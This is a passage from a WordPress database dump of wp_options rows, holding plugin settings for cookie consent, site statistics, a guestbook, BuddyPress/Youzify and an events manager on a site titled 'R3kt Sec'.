(424, 'cmplz_sync_services_complete', '1', 'yes'),
(427, 'cmplz_sync_cookies_after_services_complete', '1', 'yes'),
(428, '_transient_timeout_cmplz_purposes_en', '1669106044', 'no'),
(429, '_transient_cmplz_purposes_en', 'O:8:\"stdClass\":5:{s:2:\"61\";s:10:\"Functional\";s:2:\"64\";s:18:\"Marketing/Tracking\";s:4:\"1257\";s:11:\"Preferences\";s:2:\"63\";s:10:\"Statistics\";s:2:\"62\";s:22:\"Statistics (anonymous)\";}', 'no'),
(432, '_transient_timeout_cmplz_serviceTypes_en', '1669106048', 'no'),
(433, '_transient_cmplz_serviceTypes_en', 'O:8:\"stdClass\":53:{s:3:\"422\";s:11:\"advertising\";s:3:\"402\";s:19:\"affiliate marketing\";s:3:\"429\";s:15:\"audio streaming\";s:3:\"418\";s:16:\"buttons creation\";s:3:\"396\";s:13:\"call tracking\";s:3:\"180\";s:12:\"chat support\";s:3:\"425\";s:19:\"comments management\";s:4:\"2443\";s:13:\"Contact Forms\";s:3:\"400\";s:16:\"content creation\";s:3:\"409\";s:43:\"content distribution network (CDN) services\";s:3:\"408\";s:18:\"content management\";s:2:\"67\";s:25:\"cookie consent management\";s:4:\"1336\";s:22:\"creating online forums\";s:3:\"412\";s:14:\"creating polls\";s:3:\"399\";s:25:\"cross-channel advertising\";s:3:\"413\";s:28:\"customer identity management\";s:4:\"1157\";s:29:\"Customer Relations Management\";s:3:\"405\";s:27:\"customer support management\";s:3:\"426\";s:27:\"display of recent purchases\";s:3:\"384\";s:58:\"display of recent social posts and/or social share buttons\";s:3:\"415\";s:19:\"display of webfonts\";s:3:\"410\";s:31:\"heat maps and screen recordings\";s:4:\"3410\";s:38:\"learning management and course builder\";s:3:\"401\";s:17:\"locale management\";s:3:\"387\";s:26:\"mailing list subscriptions\";s:3:\"385\";s:12:\"maps display\";s:3:\"395\";s:48:\"marketing automation (automated email marketing)\";s:4:\"1335\";s:19:\"online appointments\";s:3:\"407\";s:12:\"page caching\";s:3:\"163\";s:30:\"page loading speed improvement\";s:3:\"161\";s:18:\"payment processing\";s:3:\"419\";s:14:\"popup creation\";s:3:\"397\";s:30:\"providing social share buttons\";s:4:\"2016\";s:18:\"push notifications\";s:3:\"411\";s:11:\"remarketing\";s:3:\"423\";s:26:\"Search Engine Optimization\";s:3:\"404\";s:16:\"search functions\";s:3:\"416\";s:29:\"security and fraud prevention\";s:3:\"398\";s:22:\"showing advertisements\";s:3:\"386\";s:15:\"spam prevention\";s:3:\"388\";s:27:\"Statistics and optimization\";s:3:\"178\";s:13:\"video display\";s:3:\"406\";s:16:\"visitor tracking\";s:4:\"1131\";s:16:\"weather forecast\";s:3:\"427\";s:8:\"webforms\";s:3:\"420\";s:18:\"webshop management\";s:3:\"421\";s:23:\"website admin functions\";s:3:\"403\";s:14:\"website design\";s:3:\"424\";s:19:\"website development\";s:3:\"414\";s:15:\"website hosting\";s:3:\"417\";s:13:\"website menus\";s:3:\"164\";s:32:\"website performance optimization\";s:3:\"162\";s:18:\"website statistics\";}', 'no'),
(442, 'cmplz_wizard_completed_once', '1', 'no'),
(603, 'wsmKeepData', '1', 'yes'),
(604, 'wsm_tables', 'a:16:{s:7:\"LOG_URL\";s:8:\"_url_log\";s:10:\"LOG_UNIQUE\";s:15:\"_logUniqueVisit\";s:9:\"LOG_VISIT\";s:9:\"_logVisit\";s:2:\"OS\";s:9:\"_oSystems\";s:4:\"BROW\";s:9:\"_browsers\";s:4:\"TOOL\";s:9:\"_toolBars\";s:2:\"SE\";s:14:\"_searchEngines\";s:2:\"RG\";s:8:\"_regions\";s:4:\"RSOL\";s:12:\"_resolutions\";s:7:\"COUNTRY\";s:10:\"_countries\";s:3:\"DHR\";s:18:\"_dailyHourlyReport\";s:3:\"MDR\";s:19:\"_monthlyDailyReport\";s:3:\"YMR\";s:20:\"_yearlyMonthlyReport\";s:3:\"DWR\";s:16:\"_datewise_report\";s:3:\"MWR\";s:17:\"_monthwise_report\";s:3:\"YWR\";s:16:\"_yearwise_report\";}', 'yes'),
(605, 'wsm_dailyReportedTime', '2022-10-24', 'yes'),
(607, 'wsmAdminColors', '', 'yes'),
(608, 'wsm_free_active_time', '1666533453', 'no'),
(611, 'wsm_popup_status', '1', 'yes'),
(612, 'wsm_lastHitTime', '2022-10-24 13:52:02', 'yes'),
(631, 'gwolle_gb-admin_style', 'false', 'yes'),
(632, 'gwolle_gb-akismet-active', 'false', 'yes'),
(633, 'gwolle_gb-entries_per_page', '20', 'yes'),
(634, 'gwolle_gb-entriesPerPage', '20', 'yes'),
(635, 'gwolle_gb-excerpt_length', '0', 'yes'),
(636, 'gwolle_gb-form', 'a:14:{s:17:\"form_name_enabled\";s:4:\"true\";s:19:\"form_name_mandatory\";s:4:\"true\";s:17:\"form_city_enabled\";s:5:\"false\";s:19:\"form_city_mandatory\";s:5:\"false\";s:18:\"form_email_enabled\";s:4:\"true\";s:20:\"form_email_mandatory\";s:5:\"false\";s:21:\"form_homepage_enabled\";s:4:\"true\";s:23:\"form_homepage_mandatory\";s:5:\"false\";s:20:\"form_message_enabled\";s:4:\"true\";s:22:\"form_message_mandatory\";s:4:\"true\";s:22:\"form_message_maxlength\";i:500;s:19:\"form_bbcode_enabled\";s:5:\"false\";s:20:\"form_privacy_enabled\";s:5:\"false\";s:21:\"form_antispam_enabled\";s:5:\"false\";}', 'yes'),
(637, 'gwolle_gb-form_ajax', 'true', 'yes'),
(638, 'gwolle_gb-honeypot', 'true', 'yes'),
(639, 'gwolle_gb-honeypot_value', '85', 'yes'),
(640, 'gwolle_gb-labels_float', 'true', 'yes'),
(641, 'gwolle_gb-linkAuthorWebsite', 'true', 'yes'),
(642, 'gwolle_gb-linkchecker', 'false', 'yes'),
(643, 'gwolle_gb-longtext', 'false', 'yes'),
(644, 'gwolle_gb-mail_author', 'false', 'yes'),
(645, 'gwolle_gb-mail_author_moderation', 'false', 'yes'),
(646, 'gwolle_gb-moderate-entries', 'false', 'yes'),
(647, 'gwolle_gb-navigation', '0', 'yes'),
(648, 'gwolle_gb-nonce', 'true', 'yes'),
(649, 'gwolle_gb-paginate_all', 'false', 'yes'),
(650, 'gwolle_gb-read', 'a:8:{s:11:\"read_avatar\";s:4:\"true\";s:9:\"read_name\";s:4:\"true\";s:9:\"read_city\";s:4:\"true\";s:13:\"read_datetime\";s:4:\"true\";s:9:\"read_date\";s:5:\"false\";s:12:\"read_content\";s:4:\"true\";s:12:\"read_aavatar\";s:5:\"false\";s:13:\"read_editlink\";s:4:\"true\";}', 'yes'),
(651, 'gwolle_gb-refuse-spam', 'false', 'yes'),
(652, 'gwolle_gb-require_login', 'false', 'yes'),
(653, 'gwolle_gb-sfs', 'false', 'yes'),
(654, 'gwolle_gb-store_ip', 'false', 'yes'),
(655, 'gwolle_gb-showEntryIcons', 'true', 'yes'),
(656, 'gwolle_gb-showLineBreaks', 'false', 'yes'),
(657, 'gwolle_gb-showSmilies', 'true', 'yes'),
(658, 'gwolle_gb-timeout', 'false', 'yes'),
(659, 'gwolle_gb_version', '4.3.0', 'yes'),
(666, 'gwolle_gb-header', 'Write a new entry for the Guestbook', 'yes'),
(667, 'gwolle_gb-notice', 'Fields marked with * are required.\r\nYour E-mail address won&#039;t be published.\r\nIt&#039;s possible that your entry will only be visible in the guestbook after we reviewed it.\r\nWe reserve the right to edit, delete, or not publish entries.', 'yes'),
(670, 'gwolle_gb-antispam-question', '', 'yes'),
(671, 'gwolle_gb-antispam-answer', '', 'yes'),
(672, 'gwolle_gb_addon-moderation_keys', '', 'yes'),
(705, 'cmplz_excluded_posts_array', 'a:0:{}', 'yes'),
(746, 'widget_gwolle_gb_search', 'a:2:{i:1;a:0:{}s:12:\"_multiwidget\";i:1;}', 'yes'),
(747, 'widget_gwolle_gb', 'a:2:{i:1;a:0:{}s:12:\"_multiwidget\";i:1;}', 'yes'),
(762, 'nav_menu_options', 'a:1:{s:8:\"auto_add\";a:0:{}}', 'yes'),
(924, 'wp_statistics', 'a:86:{s:9:\"robotlist\";s:1888:\"007ac9\r\n5bot\r\nA6-Indexer\r\nAbachoBOT\r\naccoona\r\nAcoiRobot\r\nAddThis.com\r\nADmantX\r\nAdsBot-Google\r\nadvbot\r\nAhrefsBot\r\naiHitBot\r\nalexa\r\nalphabot\r\nAltaVista\r\nAntivirusPro\r\nanyevent\r\nappie\r\nApplebot\r\narchive.org_bot\r\nAsk Jeeves\r\nASPSeek\r\nBaiduspider\r\nBenjojo\r\nBeetleBot\r\nbingbot\r\nBlekkobot\r\nblexbot\r\nBOT for JCE\r\nbubing\r\nButterfly\r\ncbot\r\nclamantivirus\r\ncliqzbot\r\nclumboot\r\ncoccoc\r\ncrawler\r\nCrocCrawler\r\ncrowsnest.tv\r\ndbot\r\ndl2bot\r\ndotbot\r\ndownloadbot\r\nduckduckgo\r\nDumbot\r\nEasouSpider\r\neStyle\r\nEveryoneSocialBot\r\nExabot\r\nezooms\r\nfacebook.com\r\nfacebookexternalhit\r\nFAST\r\nFeedfetcher-Google\r\nfeedzirra\r\nfindxbot\r\nFirfly\r\nFriendFeedBot\r\nfroogle\r\nGeonaBot\r\nGigabot\r\ngirafabot\r\ngimme60bot\r\nglbot\r\nGooglebot\r\nGroupHigh\r\nia_archiver\r\nIDBot\r\nInfoSeek\r\ninktomi\r\nIstellaBot\r\njetmon\r\nKraken\r\nLeikibot\r\nlinkapediabot\r\nlinkdexbot\r\nLinkpadBot\r\nLoadTimeBot\r\nlooksmart\r\nltx71\r\nLycos\r\nMail.RU_Bot\r\nMe.dium\r\nmeanpathbot\r\nmediabot\r\nmedialbot\r\nMediapartners-Google\r\nMJ12bot\r\nmsnbot\r\nMojeekBot\r\nmonobot\r\nmoreover\r\nMRBOT\r\nNationalDirectory\r\nNerdyBot\r\nNetcraftSurveyAgent\r\nniki-bot\r\nnutch\r\nOpenbot\r\nOrangeBot\r\nowler\r\np4Bot\r\nPaperLiBot\r\npageanalyzer\r\nPagesInventory\r\nPimonster\r\nporkbun\r\npr-cy\r\nproximic\r\npwbot\r\nr4bot\r\nrabaz\r\nRambler\r\nRankivabot\r\nrevip\r\nriddler\r\nrogerbot\r\nScooter\r\nScrubby\r\nscrapy.org\r\nSearchmetricsBot\r\nsees.co\r\nSemanticBot\r\nSemrushBot\r\nSeznamBot\r\nsfFeedReader\r\nshareaholic-bot\r\nsistrix\r\nSiteExplorer\r\nSlurp\r\nSocialradarbot\r\nSocialSearch\r\nSogou web spider\r\nSpade\r\nspbot\r\nSpiderLing\r\nSputnikBot\r\nSuperfeedr\r\nSurveyBot\r\nTechnoratiSnoop\r\nTECNOSEEK\r\nTeoma\r\ntrendictionbot\r\nTweetmemeBot\r\nTwiceler\r\nTwitterbot\r\nTwitturls\r\nu2bot\r\nuMBot-LN\r\nuni5download\r\nunrulymedia\r\nUptimeRobot\r\nURL_Spider_SQL\r\nVagabondo\r\nvBSEO\r\nWASALive-Bot\r\nWebAlta Crawler\r\nWebBug\r\nWebFindBot\r\nWebMasterAid\r\nWeSEE\r\nWotbox\r\nwsowner\r\nwsr-agent\r\nwww.galaxy.com\r\nx100bot\r\nXoviBot\r\nxzybot\r\nyandex\r\nYahoo\r\nYammybot\r\nYoudaoBot\r\nZyBorg\r\nZemlyaCrawl\";s:13:\"anonymize_ips\";s:0:\"\";s:5:\"geoip\";s:0:\"\";s:10:\"useronline\";s:1:\"1\";s:6:\"visits\";s:0:\"\";s:8:\"visitors\";s:0:\"\";s:5:\"pages\";s:0:\"\";s:12:\"check_online\";s:3:\"120\";s:8:\"menu_bar\";s:1:\"0\";s:11:\"coefficient\";s:1:\"1\";s:12:\"stats_report\";s:0:\"\";s:11:\"time_report\";s:5:\"daily\";s:11:\"send_report\";s:4:\"mail\";s:14:\"content_report\";s:0:\"\";s:12:\"update_geoip\";s:0:\"\";s:8:\"store_ua\";s:0:\"\";s:21:\"exclude_administrator\";s:1:\"1\";s:18:\"disable_se_clearch\";s:0:\"\";s:16:\"disable_se_qwant\";s:0:\"\";s:16:\"disable_se_baidu\";s:0:\"\";s:14:\"disable_se_ask\";s:0:\"\";s:8:\"map_type\";s:6:\"jqvmap\";s:18:\"force_robot_update\";s:1:\"1\";s:9:\"ip_method\";s:11:\"REMOTE_ADDR\";s:17:\"exclude_loginpage\";s:1:\"1\";s:12:\"exclude_404s\";s:1:\"1\";s:13:\"exclude_feeds\";s:1:\"1\";s:15:\"disable_se_bing\";s:0:\"\";s:21:\"disable_se_duckduckgo\";s:0:\"\";s:17:\"disable_se_google\";s:0:\"\";s:16:\"disable_se_yahoo\";s:0:\"\";s:17:\"disable_se_yandex\";s:0:\"\";s:12:\"visitors_log\";s:0:\"\";s:18:\"enable_user_column\";s:0:\"\";s:15:\"track_all_pages\";s:0:\"\";s:16:\"use_cache_plugin\";s:1:\"1\";s:14:\"disable_column\";s:0:\"\";s:16:\"hit_post_metabox\";s:0:\"\";s:9:\"show_hits\";s:0:\"\";s:21:\"display_hits_position\";s:1:\"0\";s:12:\"chart_totals\";s:0:\"\";s:12:\"hide_notices\";s:0:\"\";s:10:\"all_online\";s:0:\"\";s:20:\"strip_uri_parameters\";s:0:\"\";s:14:\"addsearchwords\";s:0:\"\";s:15:\"read_capability\";s:14:\"manage_options\";s:17:\"manage_capability\";s:14:\"manage_options\";s:14:\"exclude_editor\";s:0:\"\";s:14:\"exclude_author\";s:0:\"\";s:19:\"exclude_contributor\";s:0:\"\";s:18:\"exclude_subscriber\";s:0:\"\";s:19:\"exclude_seo_manager\";s:0:\"\";s:18:\"exclude_seo_editor\";s:0:\"\";s:17:\"record_exclusions\";s:0:\"\";s:10:\"exclude_ip\";s:0:\"\";s:18:\"excluded_countries\";s:0:\"\";s:18:\"included_countries\";s:0:\"\";s:14:\"excluded_hosts\";s:0:\"\";s:15:\"robot_threshold\";s:0:\"\";s:12:\"use_honeypot\";s:0:\"\";s:15:\"honeypot_postid\";s:0:\"\";s:13:\"excluded_urls\";s:0:\"\";s:20:\"corrupt_browser_info\";s:0:\"\";s:14:\"schedule_geoip\";s:0:\"\";s:10:\"geoip_city\";s:0:\"\";s:8:\"auto_pop\";s:0:\"\";s:20:\"private_country_code\";s:3:\"000\";s:12:\"referrerspam\";s:0:\"\";s:21:\"schedule_referrerspam\";s:0:\"\";s:6:\"wp_cli\";s:0:\"\";s:14:\"wp_cli_summary\";s:0:\"\";s:18:\"wp_cli_user_online\";s:0:\"\";s:15:\"wp_cli_visitors\";s:0:\"\";s:16:\"schedule_dbmaint\";s:0:\"\";s:21:\"schedule_dbmaint_days\";s:3:\"365\";s:24:\"schedule_dbmaint_visitor\";s:0:\"\";s:29:\"schedule_dbmaint_visitor_hits\";s:2:\"50\";s:10:\"email_list\";s:0:\"\";s:12:\"geoip_report\";s:0:\"\";s:12:\"prune_report\";s:0:\"\";s:14:\"upgrade_report\";s:0:\"\";s:13:\"admin_notices\";s:0:\"\";s:11:\"disable_map\";s:0:\"\";s:17:\"disable_dashboard\";s:0:\"\";s:14:\"disable_editor\";s:0:\"\";s:8:\"hash_ips\";s:0:\"\";}', 'yes'),
(925, 'wp_statistics_plugin_version', '13.1.5', 'yes'),
(926, 'wp_statistics_disable_addons', 'yes', 'yes'),
(927, 'widget_wp_statistics_widget', 'a:1:{s:12:\"_multiwidget\";i:1;}', 'yes'),
(928, 'wp_statistics_check_user_online', '1666542290', 'yes'),
(937, 'wp_statistics_overview_page_ads', 'a:3:{s:9:\"timestamp\";i:1666539236;s:3:\"ads\";a:2:{s:6:\"status\";s:2:\"no\";s:2:\"ID\";s:4:\"none\";}s:4:\"view\";s:0:\"\";}', 'no'),
(966, 'bp-deactivated-components', 'a:0:{}', 'yes'),
(967, 'bp-xprofile-base-group-name', 'Base', 'yes'),
(968, 'bp-xprofile-fullname-field-name', 'Name', 'yes'),
(969, 'bp-blogs-first-install', '', 'yes'),
(970, 'bp-disable-profile-sync', '', 'yes'),
(971, 'hide-loggedout-adminbar', '', 'yes'),
(972, 'bp-disable-avatar-uploads', '', 'yes'),
(973, 'bp-disable-cover-image-uploads', '', 'yes'),
(974, 'bp-disable-group-avatar-uploads', '', 'yes'),
(975, 'bp-disable-group-cover-image-uploads', '', 'yes'),
(976, 'bp-disable-account-deletion', '', 'yes'),
(977, 'bp-disable-blogforum-comments', '1', 'yes'),
(978, '_bp_theme_package_id', 'nouveau', 'yes'),
(979, 'bp-emails-unsubscribe-salt', 'VipkaTMyQjdrWSE9S1VmL2o4fiB8MXJkaiVdVUclQW1oWlU3TmApbXEgb10tbTokWUtpXnQja0NWZ2x3XWRlKA==', 'yes'),
(980, 'bp_restrict_group_creation', '', 'yes'),
(981, '_bp_enable_akismet', '1', 'yes'),
(982, '_bp_enable_heartbeat_refresh', '1', 'yes'),
(983, '_bp_retain_bp_default', '', 'yes'),
(984, '_bp_ignore_deprecated_code', '1', 'yes'),
(985, 'widget_bp_core_login_widget', '', 'yes'),
(986, 'widget_bp_core_members_widget', '', 'yes'),
(987, 'widget_bp_core_whos_online_widget', '', 'yes'),
(988, 'widget_bp_core_recently_active_widget', '', 'yes'),
(989, 'widget_bp_groups_widget', '', 'yes'),
(990, 'widget_bp_messages_sitewide_notices_widget', '', 'yes'),
(995, 'widget_youzify_author_widget', 'a:1:{s:12:\"_multiwidget\";i:1;}', 'yes'),
(996, 'widget_youzify_group_rss', 'a:1:{s:12:\"_multiwidget\";i:1;}', 'yes'),
(997, 'widget_youzify_my_account_widget', 'a:1:{s:12:\"_multiwidget\";i:1;}', 'yes'),
(998, 'widget_youzify_notifications_widget', 'a:1:{s:12:\"_multiwidget\";i:1;}', 'yes'),
(999, 'widget_youzify_post_author_widget', 'a:1:{s:12:\"_multiwidget\";i:1;}', 'yes'),
(1000, 'widget_youzify_activity_rss', 'a:1:{s:12:\"_multiwidget\";i:1;}', 'yes'),
(1001, 'widget_youzify_smart_author_widget', 'a:1:{s:12:\"_multiwidget\";i:1;}', 'yes'),
(1002, 'widget_youzify_group_administrators_widget', 'a:1:{s:12:\"_multiwidget\";i:1;}', 'yes'),
(1003, 'widget_youzify_group_moderators_widget', 'a:1:{s:12:\"_multiwidget\";i:1;}', 'yes'),
(1004, 'widget_youzify_media', 'a:1:{s:12:\"_multiwidget\";i:1;}', 'yes'),
(1005, 'widget_youzify_group_description_widget', 'a:1:{s:12:\"_multiwidget\";i:1;}', 'yes'),
(1006, 'widget_youzify_verified_users_widget', 'a:1:{s:12:\"_multiwidget\";i:1;}', 'yes'),
(1007, 'widget_youzify_mycred_balance_widget', 'a:1:{s:12:\"_multiwidget\";i:1;}', 'yes'),
(1008, 'widget_youzify_login_widget', 'a:1:{s:12:\"_multiwidget\";i:1;}', 'yes'),
(1009, 'widget_youzify_register_widget', 'a:1:{s:12:\"_multiwidget\";i:1;}', 'yes'),
(1010, 'widget_youzify_reset_password_widget', 'a:1:{s:12:\"_multiwidget\";i:1;}', 'yes'),
(1011, 'bp-active-components', 'a:5:{s:8:\"activity\";i:1;s:7:\"members\";i:1;s:8:\"settings\";i:1;s:8:\"xprofile\";i:1;s:13:\"notifications\";i:1;}', 'yes'),
(1012, 'bp-pages', 'a:4:{s:8:\"activity\";i:33;s:7:\"members\";i:34;s:8:\"register\";i:35;s:8:\"activate\";i:36;}', 'yes'),
(1013, '_bp_db_version', '13165', 'yes'),
(1016, 'youzify_pro_version_october_2022_offer', '1', 'no'),
(1459, 'widget_eme_list', 'a:1:{s:12:\"_multiwidget\";i:1;}', 'yes'),
(1460, 'widget_eme_calendar', 'a:1:{s:12:\"_multiwidget\";i:1;}', 'yes'),
(1534, 'eme_event_list_item_format', '<li>#_STARTDATE - #_STARTTIME<br /> #_LINKEDNAME<br />#_TOWN </li>', 'yes'),
(1535, 'eme_event_list_item_format_header', '<ul class=\'eme_events_list\'>', 'yes'),
(1536, 'eme_cat_event_list_item_format_header', '<ul class=\'eme_events_list\'>', 'yes'),
(1537, 'eme_event_list_item_format_footer', '</ul>', 'yes'),
(1538, 'eme_cat_event_list_item_format_footer', '</ul>', 'yes'),
(1539, 'eme_display_calendar_in_events_page', '0', 'yes'),
(1540, 'eme_display_events_in_events_page', '0', 'yes'),
(1541, 'eme_single_event_format', '#_STARTDATE - #_STARTTIME<br />#_TOWN<br />#_NOTES<br />#_ADDBOOKINGFORM<br />#_MAP', 'yes'),
(1542, 'eme_event_page_title_format', '#_EVENTNAME', 'yes'),
(1543, 'eme_event_html_title_format', '#_EVENTNAME', 'yes'),
(1544, 'eme_show_period_monthly_dateformat', 'F, Y', 'yes'),
(1545, 'eme_show_period_yearly_dateformat', 'Y', 'yes'),
(1546, 'eme_filter_form_format', '#_FILTER_CATS #_FILTER_LOCS', 'yes'),
(1547, 'eme_events_page_title', 'Events', 'yes'),
(1548, 'eme_no_events_message', 'No events', 'yes'),
(1549, 'eme_location_page_title_format', '#_LOCATIONNAME', 'yes'),
(1550, 'eme_location_html_title_format', '#_LOCATIONNAME', 'yes'),
(1551, 'eme_location_baloon_format', '<strong>#_LOCATIONNAME</strong><br />#_ADDRESS - #_TOWN<br /><a href=\'#_LOCATIONPAGEURL\'>Details</a>', 'yes'),
(1552, 'eme_location_map_icon', '', 'yes'),
(1553, 'eme_location_event_list_item_format', '<li>#_EVENTNAME - #_STARTDATE - #_STARTTIME</li>', 'yes'),
(1554, 'eme_location_no_events_message', 'No events at this location', 'yes'),
(1555, 'eme_single_location_format', '#_ADDRESS<br />#_TOWN<br />#_DESCRIPTION #_MAP', 'yes'),
(1556, 'eme_page_access_denied', 'Access denied!', 'yes'),
(1557, 'eme_membership_login_required_string', 'You need to be logged in in order to be able to register for this membership.', 'yes'),
(1558, 'eme_membership_unauth_attendance_msg', 'OK, member #_MEMBERID (#_PERSONFULLNAME) is active.', 'yes'),
(1559, 'eme_membership_attendance_msg', 'OK, member #_MEMBERID (#_PERSONFULLNAME) is active.', 'yes'),
(1560, 'eme_members_show_people_info', '0', 'yes'),
(1561, 'eme_ical_title_format', '#_EVENTNAME', 'yes'),
(1562, 'eme_ical_description_format', '#_NOTES', 'yes'),
(1563, 'eme_ical_location_format', '#_LOCATIONNAME, #_ADDRESS, #_TOWN', 'yes'),
(1564, 'eme_rss_main_title', 'R3kt Sec - Events', 'yes'),
(1565, 'eme_rss_main_description', 'Zero Days 4 Days - Events', 'yes'),
(1566, 'eme_rss_description_format', '#_STARTDATE - #_STARTTIME <br /> #_NOTES <br />#_LOCATIONNAME <br />#_ADDRESS <br />#_TOWN', 'yes'),
(1567, 'eme_rss_title_format', '#_EVENTNAME', 'yes'),
(1568, 'eme_rss_show_pubdate', '1', 'yes'),
(1569, 'eme_rss_pubdate_startdate', '0', 'yes'),
(1570, 'eme_map_is_active', '1', 'yes'),
(1571, 'eme_map_zooming', '1', 'yes'),
(1572, 'eme_indiv_zoom_factor', '14', 'yes'),
(1573, 'eme_map_gesture_handling', '0', 'yes'),
(1574, 'eme_seo_permalink', '1', 'yes'),
(1575, 'eme_permalink_events_prefix', 'events', 'yes'),
(1576, 'eme_permalink_locations_prefix', 'locations', 'yes'),
(1577, 'eme_permalink_categories_prefix', '', 'yes'),
(1578, 'eme_permalink_calendar_prefix', '', 'yes'),
(1579, 'eme_permalink_payments_prefix', '', 'yes'),
(1580, 'eme_default_contact_person', '-1', 'yes'),
(1581, 'eme_honeypot_for_forms', '1', 'yes'),
(1582, 'eme_hcaptcha_for_forms', '0', 'yes'),
(1583, 'eme_hcaptcha_site_key', '', 'yes'),
(1584, 'eme_hcaptcha_secret_key', '', 'yes'),
(1585, 'eme_recaptcha_for_forms', '0', 'yes'),
(1586, 'eme_recaptcha_site_key', '', 'yes'),
(1587, 'eme_recaptcha_secret_key', '', 'yes'),
(1588, 'eme_captcha_for_forms', '0', 'yes'),
(1589, 'eme_stay_on_edit_page', '0', 'yes'),
(1590, 'eme_rsvp_mail_notify_is_active', '1', 'yes'),
(1591, 'eme_rsvp_mail_notify_pending', '1', 'yes'),
(1592, 'eme_rsvp_mail_notify_paid', '0', 'yes'),
(1593, 'eme_rsvp_mail_notify_approved', '1', 'yes'),
(1594, 'eme_rsvp_end_target', 'start', 'yes'),
(1595, 'eme_rsvp_check_required_fields', '1', 'yes'),
(1596, 'eme_contactperson_email_subject', 'New booking for \'#_EVENTNAME\'', 'yes'),
(1597, 'eme_contactperson_email_body', '#_PERSONFULLNAME (#_PERSONEMAIL) will attend #_EVENTNAME on #_STARTDATE. They want to book #_RESPSEATS seat(s).\nNow there are #_RESERVEDSEATS seat(s) booked, #_AVAILABLESEATS are still available.\n\nYours faithfully,\nEvents Manager', 'yes'),
(1598, 'eme_contactperson_cancelled_email_subject', 'A booking has been cancelled for \'#_EVENTNAME\'', 'yes'),
(1599, 'eme_contactperson_cancelled_email_body', '#_PERSONFULLNAME (#_PERSONEMAIL) has cancelled for #_EVENTNAME on #_STARTDATE. \nNow there are #_RESERVEDSEATS seat(s) booked, #_AVAILABLESEATS are still available.\n\nYours faithfully,\nEvents Manager', 'yes'),
(1600, 'eme_contactperson_pending_email_subject', 'Approval required for new booking for \'#_EVENTNAME\'', 'yes'),
(1601, 'eme_contactperson_pending_email_body', '#_PERSONFULLNAME (#_PERSONEMAIL) would like to attend #_EVENTNAME on #_STARTDATE. They want to book #_RESPSEATS seat(s).\nNow there are #_RESERVEDSEATS seat(s) booked, #_AVAILABLESEATS are still available.\n\nYours faithfully,\nEvents Manager', 'yes'),
(1602, 'eme_contactperson_ipn_email_subject', '', 'yes'),
(1603, 'eme_contactperson_paid_email_body', '', 'yes'),
(1604, 'eme_respondent_email_subject', 'Booking for \'#_EVENTNAME\' confirmed', 'yes'),
(1605, 'eme_respondent_email_body', 'Dear #_PERSONFULLNAME,\n\nYou have successfully booked #_RESPSEATS seat(s) for #_EVENTNAME.\n\nYours faithfully,\n#_CONTACTPERSON', 'yes'),
(1606, 'eme_registration_pending_email_subject', 'Booking for \'#_EVENTNAME\' is pending', 'yes'),
(1607, 'eme_registration_pending_email_body', 'Dear #_PERSONFULLNAME,\n\nYour request to book #_RESPSEATS seat(s) for #_EVENTNAME is pending.\n\nYours faithfully,\n#_CONTACTPERSON', 'yes'),
(1608, 'eme_registration_userpending_email_subject', 'Booking for \'#_EVENTNAME\' requires your confirmation', 'yes'),
(1609, 'eme_registration_userpending_email_body', 'Dear #_PERSONFULLNAME,\n\nYour request to book #_RESPSEATS seat(s) for #_EVENTNAME requires your confirmation.\nPlease click on this link to confirm #_BOOKING_CONFIRM_URL\nIf you did not make this booking, you don\'t need to do anything, it will then be removed automatically.\n\nYours faithfully,\n#_CONTACTPERSON', 'yes'),
(1610, 'eme_registration_cancelled_email_subject', 'Booking for \'#_EVENTNAME\' cancelled', 'yes'),
(1611, 'eme_registration_cancelled_email_body', 'Dear #_PERSONFULLNAME,\n\nYour request to book #_RESPSEATS seat(s) for #_EVENTNAME has been cancelled.\n\nYours faithfully,\n#_CONTACTPERSON', 'yes'),
(1612, 'eme_registration_trashed_email_subject', 'Booking for \'#_EVENTNAME\' deleted', 'yes'),
(1613, 'eme_registration_trashed_email_body', 'Dear #_PERSONFULLNAME,\n\nYour request to book #_RESPSEATS seat(s) for #_EVENTNAME has been deleted.\n\nYours faithfully,\n#_CONTACTPERSON', 'yes'),
(1614, 'eme_registration_updated_email_subject', 'Booking for \'#_EVENTNAME\' updated', 'yes'),
(1615, 'eme_registration_updated_email_body', 'Dear #_PERSONFULLNAME,\n\nYour request to book #_RESPSEATS seat(s) for #_EVENTNAME has been updated.\n\nYours faithfully,\n#_CONTACTPERSON', 'yes'),
(1616, 'eme_registration_paid_email_subject', 'Booking for \'#_EVENTNAME\' paid', 'yes'),
(1617, 'eme_registration_paid_email_body', 'Dear #_PERSONFULLNAME,\n\nYour request to book #_RESPSEATS seat(s) for #_EVENTNAME has been paid for.\n\nYours faithfully,\n#_CONTACTPERSON', 'yes'),
(1618, 'eme_registration_pending_reminder_email_subject', 'Reminder: pending booking for event \'#_EVENTNAME\'', 'yes'),
(1619, 'eme_registration_pending_reminder_email_body', 'Dear #_PERSONFULLNAME,\n\nThis is a reminder that your request to book #_RESPSEATS seat(s) for #_EVENTNAME is pending.\n\nYours faithfully,\n#_CONTACTPERSON', 'yes'),
(1620, 'eme_registration_reminder_email_subject', 'Reminder: Booking for event \'#_EVENTNAME\'', 'yes'),
(1621, 'eme_registration_reminder_email_body', 'Dear #_PERSONFULLNAME,\n\nThis is a reminder that you booked #_RESPSEATS seat(s) for #_EVENTNAME.\n\nYours faithfully,\n#_CONTACTPERSON', 'yes'),
(1622, 'eme_registration_recorded_ok_html', 'Your booking has been recorded', 'yes');
INSERT INTO `wp_options` (`option_id`, `option_name`, `option_value`, `autoload`) VALUES
(1623, 'eme_registration_form_format', '<table class=\'eme-rsvp-form\'>\n            <tr><th scope=\'row\'>Last name*:</th><td>#_LASTNAME</td></tr>\n            <tr><th scope=\'row\'>First name*:</th><td>#REQ_FIRSTNAME</td></tr>\n            <tr><th scope=\'row\'>E-Mail*:</th><td>#_EMAIL</td></tr>\n            <tr><th scope=\'row\'>Phone number:</th><td>#_PHONE</td></tr>\n            <tr><th scope=\'row\'>Seats*:</th><td>#_SEATS</td></tr>\n            <tr><th scope=\'row\'>Comment:</th><td>#_COMMENT</td></tr>\n            </table>\n            #_SUBMIT\n            ', 'yes'),
(1624, 'eme_cancel_form_format', '<table class=\'eme-rsvp-form\'>\n            <tr><th scope=\'row\'>Last name*:</th><td>#_LASTNAME</td></tr>\n            <tr><th scope=\'row\'>First name*:</th><td>#REQ_FIRSTNAME</td></tr>\n            <tr><th scope=\'row\'>E-Mail*:</th><td>#_EMAIL</td></tr>\n            </table>\n            #_SUBMIT\n            ', 'yes'),
